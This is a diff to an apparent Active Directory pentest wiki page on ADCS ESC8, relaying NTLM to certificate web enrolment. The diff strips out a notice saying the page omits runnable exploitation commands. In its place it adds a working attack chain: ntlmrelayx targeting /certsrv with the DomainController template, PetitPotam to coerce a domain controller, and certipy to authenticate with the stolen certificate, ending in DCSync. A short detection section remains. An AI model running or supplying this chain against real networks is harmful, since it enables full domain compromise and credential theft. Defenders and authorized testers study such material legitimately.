@@ -10,23 +10,42 @@ mitre: "T1649"
 tag: null
 ---
 
+
 # ADCS ESC8 (NTLM relay to CA web enrollment)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **ADCS web-enrolment endpoint** (`/certsrv/`) — NTLM authentication.
 
-## Detection
+### Concept (deep)
+HTTP enrolment accepts **NTLM**. Coerce a DC/privileged machine and **relay** to the endpoint → **machine certificate** → **PKINIT** → DCSync rights.
+
+### Attack flow (Mermaid)
+```mermaid
+sequenceDiagram
+    participant V as DC (coerced)
+    participant A as ntlmrelayx
+    participant CA as /certsrv
+    V->>A: NTLM
+    A->>CA: Relay NTLM
+    CA-->>A: DC machine certificate
+    A->>A: PKINIT → TGT (DC$)
+    A->>A: DCSync
+```
+
+### Commands
+```bash
+# ── Relay to ADCS ────────────────────────────────────────────────────
+ntlmrelayx.py -t http://10.10.10.20/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# ── Coerce a DC ──────────────────────────────────────────────────────
+python3 PetitPotam.py 10.10.10.99 10.10.10.5
+
+# ── Authenticate with the issued certificate ────────────────────────
+certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
+```
+
+### Detection
 NTLM auth to `/certsrv` (IIS **4624 type 3**); **EPA** + disable NTLM on the enrolment site; **4886** for `DomainController` template issued to a non-DC.
 
 ---
-
-## References
-
-- [Microsoft: IIS Extended Protection](https://learn.microsoft.com/iis/configuration/system.webserver/security/authentication/extended-protection)
-- [Microsoft: AD CS web enrollment](https://learn.microsoft.com/windows-server/identity/ad-cs/network-device-enrollment-service-overview)
-- [Microsoft: AD CS overview](https://learn.microsoft.com/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
